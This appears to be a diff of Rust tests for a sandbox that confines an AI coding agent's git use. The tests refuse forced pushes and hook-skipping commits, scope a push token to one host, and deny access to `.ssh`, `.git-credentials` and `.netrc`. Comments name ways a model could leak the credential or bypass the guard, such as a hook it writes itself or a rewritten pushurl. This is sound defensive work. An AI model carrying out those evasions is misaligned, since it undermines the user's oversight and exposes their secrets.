+        ] {
+            assert_eq!("refused", verdict(&argv), "the hooks were skipped: {:?}", argv);
+        }
+        let s = why(&["git", "commit", "-n", "-m", "wip"]);
+        assert!(s.contains("credential"), "the refusal does not say what the hook is for: {}", s);
+        assert!(s.contains("nine days later"),
+            "the refusal does not carry the history that makes it non-negotiable: {}", s);
+        // An ordinary commit is untouched, and `-n` on a PUSH is `--dry-run`, not `--no-verify`.
+        assert_eq!("other", verdict(&["git", "commit", "-m", "a message about -n"]));
+        assert_eq!("other", verdict(&["git", "commit", "-am", "wip"]));
+        assert_eq!("push",  verdict(&["git", "push", "-n"]));
+    }
+
+    /// **What is not a git command is not this function's business** -- and that is the whole
+    /// reason the guard can live in the page.
+    ///
+    /// `env git push --force` and `sh -c '…'` are not caught, and do not need to be: `argv[0]` is
+    /// not `git`, so no credential is attached, so the push cannot authenticate.  The guard and
+    /// the credential are one decision, which is what makes "there is no spelling that evades the
+    /// guard and keeps the token" true rather than hoped for.
+    #[test]
+    fn test_a_command_that_is_not_git_is_left_alone_and_gets_no_credential() {
+        for argv in [
+            vec!["cargo", "test", "--lib"],
+            vec!["git"],
+            vec!["git", "--version"],
+            vec!["git", "status"],
+            vec!["git", "log", "--oneline"],
+            vec!["git", "add", "-A"],
+            vec!["git", "diff", "--cached"],
+            vec!["env", "git", "push", "--force"],
+            vec!["sh", "-c", "git push -f"],
+        ] {
+            assert_eq!("other", verdict(&argv), "the guard claimed a command: {:?}", argv);
+        }
+        // The PROGRAM decides it and nothing else. This is the half the list above does not
+        // prove: `env git push --force` reads as `Other` even with the program check removed,
+        // because `env` is not a subcommand either -- so a wrapper whose own name ends in
+        // something else is the case that shows the check is doing work. Without it, `mygit push
+        // origin main` is a Push, and a program nobody vetted is handed the credential.
+        for argv in [
+            vec!["mygit", "push", "origin", "main"],
+            vec!["git-wrapper", "push", "origin", "main"],
+            vec!["./push.sh", "push", "origin", "main"],
+            vec!["gitk", "push", "origin", "main"],
+        ] {
+            assert_eq!("other", verdict(&argv),
+                "a program that is not git was treated as git: {:?}", argv);
+        }
+        // And the real thing, named in full, still is git.
+        assert_eq!("push", verdict(&["/usr/bin/git", "push", "origin", "main"]));
+    }
+
+    /// **`run` makes one decision about a git command, and it is this function.**
+    ///
+    /// The call site in `Tool::run` is three lines and wasm-only, so it cannot be tested; this is
+    /// everything it decides.  The ORDER is the check: a refused push is refused whether or not
+    /// the network is there and whether or not a credential exists, because a model told "no
+    /// network" about a `--force` would take the network away as the thing to fix.
+    #[test]
+    fn test_run_decides_a_git_command_in_one_place_and_in_one_order() {
+        let force: Vec<String> = ["git", "push", "--force"].iter().map(|s| s.to_string()).collect();
+        let good:  Vec<String> = ["git", "push", "origin", "main"].iter()
+            .map(|s| s.to_string()).collect();
+        let build: Vec<String> = ["cargo", "build"].iter().map(|s| s.to_string()).collect();
+
+        assert_eq!(GitStep::Plain, git_step(&build, "/home/u/work", false));
+        assert_eq!(GitStep::Plain, git_step(&build, "/home/u/work", true),
+            "an ordinary command is not this function's business either way");
+
+        // The guard wins over the network and over the missing credential, both.
+        for no_net in [false, true] {
+            match git_step(&force, "/home/u/work", no_net) {
+                GitStep::Refuse(s) => assert!(s.contains("fast-forward"),
+                    "the wrong refusal came back for a force with no_net={}: {}", no_net, s),
+                other => panic!("a forced push was not refused with no_net={}: {:?}", no_net,
+                    other),
+            }
+        }
+        // The network is next, and it is said before the credential is looked for -- otherwise a
+        // user with no token set is told to set one for a push that could not have gone out.
+        match git_step(&good, "/home/u/work", true) {
+            GitStep::Refuse(s) => assert!(s.contains("network refused"), "{}", s),
+            other              => panic!("a push went out on a turn with no network: {:?}", other),
+        }
+        // Then the credential.
+        match git_step(&good, "/home/u/work", false) {
+            GitStep::Refuse(s) => assert!(s.contains("no push credential"), "{}", s),
+            other              => panic!("a push proceeded with no credential: {:?}", other),
+        }
+        assert!(set_push_cred(Some(cred())));
+        match git_step(&good, "/home/u/work", false) {
+            GitStep::WithEnv(e) => {
+                assert!(e.iter().any(|(k, _)| k == "GIT_CONFIG_COUNT"),
+                    "the push carried no configuration: {:?}", e);
+                assert!(e.iter().any(|(_, v)| v.contains("/home/u/work/.daimond")),
+                    "the fence's own root did not reach the configuration: {:?}", e);
+            },
+            other => panic!("a good push did not carry the credential: {:?}", other),
+        }
+        // And an ordinary command still carries nothing, with a credential held.
+        assert_eq!(GitStep::Plain, git_step(&build, "/home/u/work", false),
+            "a credential leaked into a command that was not a push");
+        assert_eq!(GitStep::Plain,
+            git_step(&["git".to_string(), "status".to_string()], "/home/u/work", false));
+        set_push_cred(None);
+    }
+
+    // ── The credential itself ────────────────────────────────────────
+
+    /// A credential for the tests, with a value nothing else in this file could produce.
+    fn cred() -> PushCred {
+        PushCred::new("github.com", "", "ghp_TESTTOKEN0123456789").expect("cred")
+    }
+
+    /// **The token is never in `argv`, and it is never in a message either.**
+    ///
+    /// `ToolContext` and `ToolRegistry` both derive `Debug`, so a credential held in a struct with
+    /// a derived `Debug` is a credential with a publication schedule.  `PushCred` writes its own.
+    #[test]
+    fn test_the_token_cannot_be_printed_by_accident() {
+        let c = cred();
+        let shown = fmt!("{:?}", c);
+        assert!(!shown.contains("ghp_TESTTOKEN"), "Debug printed the token: {}", shown);
+        assert!(shown.contains("<withheld>"), "{}", shown);
+        assert!(shown.contains("github.com"), "the host is not a secret and is worth having: {}",
+            shown);
+        // And a refusal from the constructor must not quote the value it refused.
+        let e = PushCred::new("github.com", "", "has a space\n").expect_err("refused");
+        assert!(!fmt!("{}", e).contains("has a space"), "the error quoted the token: {}", e);
+    }
+
+    /// **The credential is checked into a shape that can travel**, because a token carrying a line
+    /// break would end the HTTP header and begin another one.
+    #[test]
+    fn test_a_credential_that_could_not_travel_is_refused_rather_than_encoded() {
+        assert!(PushCred::new("github.com", "", "").is_err(), "an empty token");
+        assert!(PushCred::new("github.com", "", "  ").is_err(), "whitespace is empty");
+        assert!(PushCred::new("github.com", "", "a\nb").is_err(), "a line break");
+        assert!(PushCred::new("github.com", "", "a b").is_err(), "a space");
+        assert!(PushCred::new("github.com", "", "a\tb").is_err(), "a tab");
+        assert!(PushCred::new("github.com", "", "tok\u{00e9}n").is_err(), "outside ASCII");
+        assert!(PushCred::new("github.com", "", &"x".repeat(PUSH_TOKEN_MAX + 1)).is_err(), "huge");
+        assert!(PushCred::new("github.com", "oauth2:x", "tok").is_err(), "a colon in the user");
+        // And the hosts, which is where a token could be sent somewhere nobody chose.
+        for bad in ["", "github", "https://github.com", "github.com/o/r", "github.com:443",
+                    "user@github.com", "git hub.com", ".com", "github.com."] {
+            assert!(PushCred::new(bad, "", "tok").is_err(), "'{}' was accepted as a host", bad);
+        }
+        assert!(PushCred::new("GitHub.com", "", "tok").is_ok(), "case is not a difference");
+        assert_eq!("github.com",
+            PushCred::new("GitHub.com/", "", "tok").expect("cred").host(),
+            "the host is folded and trimmed once, here, rather than at every use");
+    }
+
+    /// **The header is the header**, checked against `base64` the program rather than against this
+    /// crate's own encoder.
+    ///
+    /// A round trip through `base64::decode` would establish that the encoder agrees with itself,
+    /// which is no evidence at all: if both halves shared a fault the test would still pass and
+    /// the push would still fail with a 401 nobody could explain.
+    #[test]
+    fn test_the_authorization_header_matches_what_base64_produces() {
+        use std::io::Write;
+        let c = cred();
+        let mut ch = match std::process::Command::new("base64")
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .spawn()
+        {
+            Ok(c)  => c,
+            Err(_) => return, // no oracle on this machine; the other checks still hold
+        };
+        if let Some(mut si) = ch.stdin.take() {
+            si.write_all(b"x-access-token:ghp_TESTTOKEN0123456789").expect("write");
+        }
+        let out = ch.wait_with_output().expect("base64");
+        let want = fmt!("Authorization: Basic {}",
+            String::from_utf8_lossy(&out.stdout).trim());
+        assert_eq!(want, c.header(), "the header is not what base64 says it is");
+    }
+
+    /// **Every setting a push needs travels in the environment, and each one is load-bearing.**
+    ///
+    /// Written as properties rather than as a fixed string, because the string will change and
+    /// each of these must not: the count must match what follows it or git reads a partial
+    /// configuration; the credential must be scoped to one host or a rewritten `pushurl` carries
+    /// it to a stranger; the helper must be cleared or a helper in the repository's own config
+    /// runs; `ext::` must be closed or the remote's URL is a command; and hooks must be off or a
+    /// `pre-push` script the model wrote reads the credential out of its own environment.
+    #[test]
+    fn test_the_push_environment_carries_the_whole_of_the_arrangement() {
+        let env = cred().git_env("/home/u/work");
+        let get = |k: &str| -> String {
+            env.iter().find(|(n, _)| n == k).map(|(_, v)| v.clone())
+                .unwrap_or_else(|| panic!("{} is missing from the push environment", k))
+        };
+        // The count and what follows it must agree, or git reads half a configuration.
+        let n: usize = get("GIT_CONFIG_COUNT").parse().expect("a number");
+        for i in 0..n {
+            assert!(env.iter().any(|(k, _)| *k == fmt!("GIT_CONFIG_KEY_{}", i)),
+                "GIT_CONFIG_COUNT says {} but key {} is missing", n, i);
+            assert!(env.iter().any(|(k, _)| *k == fmt!("GIT_CONFIG_VALUE_{}", i)),
+                "GIT_CONFIG_COUNT says {} but value {} is missing", n, i);
+        }
+        assert!(!env.iter().any(|(k, _)| *k == fmt!("GIT_CONFIG_KEY_{}", n)),
+            "there is a key past the count, and git will not read it");
+        let keys: Vec<&str> = env.iter().filter(|(k, _)| k.starts_with("GIT_CONFIG_KEY_"))
+            .map(|(_, v)| v.as_str()).collect();
+        let val = |key: &str| -> String {
+            let i = keys.iter().position(|k| *k == key)
+                .unwrap_or_else(|| panic!("no config key {} in {:?}", key, keys));
+            get(&fmt!("GIT_CONFIG_VALUE_{}", i))
+        };
+        // Scoped to one host. An unscoped `http.extraHeader` would go to whatever host the push
+        // reached, and `.git/config` -- where `remote.origin.pushurl` lives -- is a file the model
+        // can write.
+        assert!(keys.contains(&"http.https://github.com/.extraHeader"),
+            "the credential is not scoped to one host: {:?}", keys);
+        assert!(!keys.iter().any(|k| *k == "http.extraHeader"),
+            "an unscoped header would follow a rewritten pushurl anywhere: {:?}", keys);
+        assert!(val("http.https://github.com/.extraHeader").starts_with("Authorization: Basic "));
+        // A helper in the repository's own config is cleared rather than run; empty is the reset.
+        assert_eq!("", val("credential.helper"));
+        // `ext::` runs a command named in the remote's URL.
+        assert_eq!("never",  val("protocol.allow"));
+        assert_eq!("always", val("protocol.https.allow"));
+        // No hook runs with the credential in its environment: the path is inside the one
+        // directory every fence denies.
+        assert!(val("core.hooksPath").starts_with("/home/u/work/.daimond"),
+            "hooks are not disabled: {}", val("core.hooksPath"));
+        // The SSH remote the user actually has, rewritten for the push and nowhere else.
+        let rewrites: Vec<String> = keys.iter().enumerate()
+            .filter(|(_, k)| **k == "url.https://github.com/.insteadOf")
+            .map(|(i, _)| get(&fmt!("GIT_CONFIG_VALUE_{}", i)))
+            .collect();
+        assert!(rewrites.contains(&fmt!("git@github.com:")), "{:?}", rewrites);
+        assert!(rewrites.contains(&fmt!("ssh://git@github.com/")), "{:?}", rewrites);
+        // A prompt would hang on a pipe until the timeout rather than fail.
+        assert_eq!("0", get("GIT_TERMINAL_PROMPT"));
+        // And the token is in exactly one place, encoded, and in no name.
+        let carrying = env.iter().filter(|(_, v)| v.contains("ghp_TESTTOKEN")).count();
+        assert_eq!(0, carrying, "the token appears in the environment in the clear");
+        assert!(!env.iter().any(|(k, _)| k.contains("ghp_")), "the token is in a NAME");
+    }
+
+    /// **The credential is held by the app and reachable by nothing else.**
+    ///
+    /// There is no accessor for the token at all, which is a property of the module rather than of
+    /// a test -- so what is checked here is the seam the page uses: set it, see the host, take it
+    /// away again.
+    #[test]
+    fn test_the_page_can_set_and_clear_a_credential_and_read_back_only_the_host() {
+        assert_eq!(None, push_host(), "a credential was held before anything set one");
+        assert_eq!("", push_note(), "a briefing promised a push with no credential set");
+        assert!(set_push_cred(Some(cred())));
+        assert_eq!(Some(fmt!("github.com")), push_host());
+        let note = push_note();
+        assert!(note.contains("github.com"), "{}", note);
+        assert!(note.contains("--force") && note.contains("fast-forward"),
+            "the briefing must say the rule, or the model spends turns discovering it: {}", note);
+        assert!(note.contains("no hooks"),
+            "the one surprise has to be in the briefing or it reads as a broken repo: {}", note);
+        let env = push_env("/home/u/work").expect("an environment while one is held");
+        assert!(env.iter().any(|(k, _)| k == "GIT_CONFIG_COUNT"));
+        assert!(!set_push_cred(None));
+        assert_eq!(None, push_host());
+        assert!(push_env("/home/u/work").is_none(), "a cleared credential still produced one");
+        assert!(push_unconfigured_refusal().contains("Settings"),
+            "the refusal must say where the user sets it");
+        assert!(push_unconfigured_refusal().contains("SSH"),
+            "and why the obvious alternative is not one");
+    }
+
+    // ── `.git` is walked when it is named, and read whenever it is asked for ──
+
+    /// **The skip is about WALKING and never about reading.**
+    ///
+    /// `file_read` on `.git/HEAD` opens it; `file_glob` from an ancestor does not descend into
+    /// `.git`; and `file_glob` that NAMES `.git` does.  All three at once, because the confusion
+    /// this repairs is exactly that the first was believed to be blocked by the second.
+    #[test]
+    fn test_the_repository_directory_is_skipped_by_a_walk_and_never_refused_to_a_reader() {
+        let c = ctx();
+        put(&c, ".git/HEAD", "ref: refs/heads/main\n");
+        put(&c, ".git/logs/HEAD", "0000 abcd Jason <j@x> 1 commit (initial)\n");
+        put(&c, "src/main.rs", "fn main() {}\n");
+
+        // Read: open by name, no argument, no ceremony.
+        let head = Tool::FileRead.execute_sync(r#"{"path":".git/HEAD"}"#, &c).expect("read HEAD");
+        assert!(head.contains("refs/heads/main"), "a named path inside .git was not readable: {}",
+            head);
+
+        // Walk from above: passed over, and SAID to be passed over.
+        let above = Tool::FileGlob.execute_sync(r#"{"pattern":"**/HEAD"}"#, &c).expect("glob");
+        assert!(!above.contains(".git/HEAD"), "the walk descended into .git unasked: {}", above);
+        assert!(above.contains("NOT walked"), "and it did not say so: {}", above);
+
+        // Named: walked, and said to have been walked -- because "nothing there" and "here is
+        // what is there" are the two readings of an empty result and only one is true.
+        let named = Tool::FileGlob.execute_sync(r#"{"pattern":".git/**"}"#, &c).expect("glob");
+        assert!(named.contains(".git/HEAD"), "naming .git did not walk it: {}", named);
+        assert!(named.contains(".git/logs/HEAD"), "{}", named);
+        assert!(named.contains("WALKED by name"), "{}", named);
+        // And naming it does not quietly turn on the other four.
+        let by_path = Tool::FileGlob.execute_sync(
+            r#"{"pattern":"**/HEAD","path":".git"}"#, &c).expect("glob");
+        assert!(by_path.contains("HEAD"), "naming it in 'path' did not walk it: {}", by_path);
+
+        // A search behaves the same way, through the same rule.
+        let s = Tool::FileSearch.execute_sync(
+            r#"{"query":"refs/heads","glob":".git/**"}"#, &c).expect("search");
+        assert!(s.contains(".git/HEAD"), "a named search did not reach it: {}", s);
+        let t = Tool::FileSearch.execute_sync(r#"{"query":"refs/heads"}"#, &c).expect("search");
+        assert!(!t.contains(".git/HEAD"), "an unnamed search walked it: {}", t);
+    }
+
+    /// **Naming is whole-segment**, so a name that merely looks like one is not one.
+    ///
+    /// `.gitignore` and `**/*.git` are the two spellings that would turn the object store on by
+    /// accident, and `target` is the one that would make every search of a Rust workspace read a
+    /// gigabyte of build output.
+    #[test]
+    fn test_only_a_whole_segment_counts_as_naming_a_skipped_directory() {
+        let all = Skips::new(true, &[]);
+        for d in [".git", ".hg", ".svn", "node_modules", "target"] {
+            assert!(!all.skips(d), "\"all\":true must walk {}", d);
+        }
+        assert!(all.by_name().is_empty(), "\"all\" is not the same as naming one");
+
+        let none = Skips::default_rule();
+        for d in [".git", ".hg", ".svn", "node_modules", "target"] {
+            assert!(none.skips(d), "the default must pass over {}", d);
+        }
+        assert_eq!(5, none.passed_over().len());
+
+        // Named, in each of the shapes a caller writes.
+        for text in [".git", ".git/**", "**/.git/logs/*", "code/rust/fe2o3/.git", ".git/refs/**"] {
+            let s = Skips::new(false, &[text]);
+            assert!(!s.skips(".git"), "'{}' names .git and did not turn it on", text);
+            assert_eq!(vec![".git"], s.by_name(), "'{}'", text);
+            assert!(s.skips("node_modules"), "'{}' turned on more than it named", text);
+            assert!(!s.passed_over().contains(&".git"),
+                "the note would say it passed over a directory it walked: '{}'", text);
+        }
+        // Not named, in the shapes that look like it.
+        for text in [".gitignore", "**/*.git", "src/**/*.rs", "gitconfig", "a.git.b", ""] {
+            let s = Skips::new(false, &[text]);
+            assert!(s.skips(".git"), "'{}' should not name .git", text);
+            assert!(s.by_name().is_empty(), "'{}'", text);
+        }
+        // Both fields are read: `path` and `glob` each name independently.
+        let s = Skips::new(false, &["target", ".hg/**"]);
+        assert!(!s.skips("target") && !s.skips(".hg"));
+        assert!(s.skips(".git") && s.skips("node_modules"));
+        assert_eq!(vec![".git", ".svn", "node_modules"], s.passed_over());
+    }
+
+    // ── The one refusal that looks like a broken command ─────────────
+
+    /// **A walk that meets `.daimond` is told what it met.**
+    ///
+    /// `find` over the workspace root exits non-zero with "Permission denied", and nothing in that
+    /// output says the path is denied rather than missing, or that everything else was read.  It
+    /// is said at the moment it happens rather than in the briefing, which is paid for on every
+    /// request of every turn.
+    #[test]
+    fn test_a_walk_stopped_by_daimonds_own_directory_is_told_why() {
+        let argv = vec![fmt!("find"), fmt!("/home/u/work"), fmt!("-name"), fmt!("*.rs")];
+        let hit = Tool::run_result(&argv, r#"{"stdout":"/home/u/work/src/main.rs",
+            "stderr":"find: '/home/u/work/.daimond': Permission denied","exit":1}"#,
+            &ctx(), false);
+        assert!(hit.contains("that is the fence working"),
+            "a denied walk was not explained: {}", hit);
+        assert!(hit.contains("complete apart from that one directory"),
+            "and it must say the results are otherwise whole: {}", hit);
+        let close = hit.find(UNTRUSTED_CLOSE).expect("no envelope");
+        let at = hit.find("[the '.daimond' directory").expect("no note");
+        assert!(at > close, "Daimond's own sentence is inside the command's envelope: {}", hit);
+
+        // Both halves of the test are needed, and each is checked alone. A denial that is not
+        // about `.daimond` is one of a dozen ordinary failures; the directory's own name appears
+        // in any listing of the workspace.
+        let other_denial = Tool::run_result(&argv,
+            r#"{"stdout":"","stderr":"find: '/root': Permission denied","exit":1}"#,
+            &ctx(), false);
+        assert!(!other_denial.contains("that is the fence working"),
+            "an unrelated permission failure was blamed on the fence: {}", other_denial);
+        let mere_listing = Tool::run_result(&vec![fmt!("ls")],
+            r#"{"stdout":".daimond\nsrc\n","exit":0}"#, &ctx(), false);
+        assert!(!mere_listing.contains("that is the fence working"),
+            "a listing that merely names the directory got the note: {}", mere_listing);
+    }
+
+    // ── A git that can see the user's own configuration ──────────────
+
+    /// **A git toolkit grants the configuration and never a credential.**
+    ///
+    /// Without `~/.gitconfig` a fenced git runs with no identity and, worse, with no
+    /// `core.hooksPath` -- so the credential-scanning `pre-commit` hook does not run and does not
+    /// say that it did not.  Refusing `--no-verify` while the hook cannot run at all would be a
+    /// guard protecting nothing, which is why this grant exists beside that refusal.
+    #[test]
+    fn test_the_git_toolkit_grants_the_configuration_and_denies_every_credential() {
+        let m = Machine {
+            os: fmt!("linux"), root: fmt!("/home/u/work"),
+            home: Some(fmt!("/home/u")), caps: vec![fmt!("fence:linux")],
+        };
+        let kit = Kit::resolve(&[Toolkit::Git.bound()], &m).expect("git resolves");
+        assert!(kit.ro.contains(&fmt!("/home/u/.gitconfig")), "{:?}", kit.ro);
+        assert!(kit.ro.contains(&fmt!("/home/u/.config/git")), "{:?}", kit.ro);
+        // Nothing is writable: a configuration a command could rewrite is a configuration that
+        // decides what runs on the user's next commit.
+        assert!(kit.rw.is_empty(), "the git toolkit granted a write: {:?}", kit.rw);
+        for denied in [".ssh", ".git-credentials", ".config/git/credentials", ".netrc"] {
+            assert!(kit.deny.contains(&fmt!("/home/u/{}", denied)),
+                "{} is not denied: {:?}", denied, kit.deny);
+        }
+        // `HOME` is how git finds any of it, and it is set for this toolkit alone.
+        assert!(kit.env.iter().any(|(k, v)| k == "HOME" && v == "/home/u"),
+            "git cannot find the configuration it was granted: {:?}", kit.env);
+        let rust = Kit::resolve(&[Toolkit::Rust.bound()], &m).expect("rust resolves");
+        assert!(!rust.env.iter().any(|(k, _)| k == "HOME"),
+            "HOME was set for a toolkit that did not ask for it: {:?}", rust.env);
+        // And the fence says the same thing the kit does, which is what the hand enforces.
+        let f = fence_spec(&[Toolkit::Git.bound()], &m, false);
+        assert!(f.ro.contains(&fmt!("/home/u/.gitconfig")), "{:?}", f.ro);
+        assert!(f.deny.contains(&fmt!("/home/u/.ssh")), "{:?}", f.deny);
+        assert!(!f.rw.contains(&fmt!("/home/u/.gitconfig")), "{:?}", f.rw);
+        // A toolkit is the user's grant and is never inferred, so a turn that was granted nothing
+        // reaches none of it however plainly its command says `git`.
+        let bare = fence_spec(&[], &m, false);
+        assert!(!bare.ro.iter().any(|p| p.contains(".gitconfig")), "{:?}", bare.ro);
+        assert_eq!(Ok(Toolkit::Git), Toolkit::parse("git").map_err(|_| ()));
     }
 }
 
